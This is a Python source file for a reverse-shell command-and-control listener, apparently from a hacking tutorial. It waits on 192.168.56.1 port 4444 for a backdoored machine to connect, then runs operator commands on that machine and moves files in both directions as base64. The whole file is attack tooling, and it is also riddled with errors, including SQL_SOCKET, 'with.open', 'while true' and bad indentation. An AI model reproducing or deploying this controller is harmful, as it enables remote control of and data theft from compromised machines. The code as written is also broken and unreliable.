import subprocess
import socket
import json
import os
import base64

class Listner:
	def __init__(self, ip, port):
		listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listner.setsockopt(socket.SQL_SOCKET, socket.SO_REUSEADDR, 1)
		listner.bind(ip, port) 
		listner.listen(0)
		print("[+] waiting for connection")
		self.connection, addr= listner.accept()
		print("[+] connected from "+str(addr))

	def reliable_send(self, data):
		json_data = json.dumps(data)
		return self.connection.send(json_data)
		
	
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)

			except ValueError:
				continue

	def execute_remotely(self, cmd):
		self.reliable_send(cmd)
		
		if cmd[0]== "exit":
			self.connection.close()
			exit()
		return self.reliable.receive()

	def write_file(self, path, content):
		with.open(path, "wb") as file:
			file.write(content)
			return "[+] download success"	
	
	def read_file(self, path):
		with.open(path, "rb") as file:
			return base64.b64encode(file.read())

	def run(self):
		while true:
			
			cmd =raw_input(">> ")
			cmd=cmd.split(" ")
				try:
					if cmd[0]=="upload":
						file_content = self.read_file(cmd[1])
						cmd.append(file_content)
					result= self.execute_remotely(cmd)

					if cmd[0]=="download":
						result=self.write_file(cmd[1], base64.b64decode(result))
				except Exception:
					result= "cmd error"	
				print(result)
			
my_listner= Listner("192.168.56.1", 4444)
my_listner.run()

